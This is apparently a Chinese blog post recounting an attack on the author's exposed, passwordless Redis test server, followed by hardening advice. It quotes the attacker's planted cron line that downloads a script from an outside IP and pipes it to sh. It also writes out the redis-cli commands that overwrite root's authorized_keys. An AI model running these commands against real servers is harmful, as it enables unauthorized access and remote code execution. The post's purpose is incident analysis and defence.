# redis存在的漏洞

### 场景简介
最近自己的测试服务器，连续两次redis数据被flushdb，并且我的centos服务器被shotdown了，引起了我的重视，redis数据丢失，服务器关机。如果正式服务器出现这种情况，估计老板要拿程序员祭天了。

测试服务器中reids端口利用的6379(没有修改端口),密码无，6379端口对外开放，这样的情况可以说是光屁股裸奔，人家不搞你搞谁。由于我没有设置redis密码，利用redis-cli可以执行flushdb清空数据。可是为什么服务器被关机了呢？请看下文。

接下来寻找服务器被关机的原因

### 步骤

1. 我先查看redis中当前存在的keys值，调用keys * 出现了一个名为：trojans1的键(汉语意思是木马，黑客哥哥还是很够意思的，创建如此让人醒目的键值)
```
> get trojans1
"trojans1"
"\b*/5 * * * * curl -fsSL http://43.243.130.172:60253/work.exe | sh\n"
```

2. 经过第一步可以知道我的redis被攻击了，再加上服务器被关机，我首先想到我密码丢了吗(那么复杂的密码，不会被破解吧)，然后我想先去看看服务器是否保存了未知用户的ssh公钥，我进入~/.ssh目录查看authorized_keys文件，诶，确实有一个未知的ssh公钥。我们服务器被攻击了，服务器保存了未知用户的公钥，可以免密码登录服务器进行任意操作

3. 奇了怪了，服务器怎么被攻击的呢？首先通过上文可以知道攻击途径可能是redis，百度了一下redis flushdb 攻击，被我发现了一个奇淫技巧，通过redis可以覆盖authorized_keys文件，然后此时未授权用户就可以通过ssh登录到服务器，好神奇呦，接下来写个笔记总结一下redis如何将自己的ssh公钥上传到redis服务器，并覆盖authorized keys文件

### 重头戏来了

常见的攻击方式
```
# 将本机公钥内容放到redis-server的redis键里面
cat /root/.ssh/id_rsa.pub | redis-cli -h 192.168.1.101 -x set redis
# 连接redis服务器
redis-cli -h 192.168.1.101
# 快照的存储地址
config set dir /root/.ssh/
# 设置执行save时快照的文件名
config set dbfilename "authorized_keys"
# 保存redis快照
save
```

另一种攻击方式

将redis快照存储到/var/spool/cron目录下，利用定时任务执行远程脚本

### 调用set dir * * *的时候会执行失败

情况一：
(error) ERR Changing directory: No such file or directory

情况二：(error) ERR Changing directory: Permission denied

### 解决方案
不要以root身份运行

不要设置6379默认端口

尽量设置密码

修改config还有flushdb还有keys的别名
```
# 修改redis.conf的配置
rename-command FLUSHALL ""
rename-command FLUSHDB  ""
rename-command CONFIG   ""
rename-command KEYS     ""
```

docker中运行也是个不错的解决方案，因为docker中最小单元可能没有ssh还有定时任务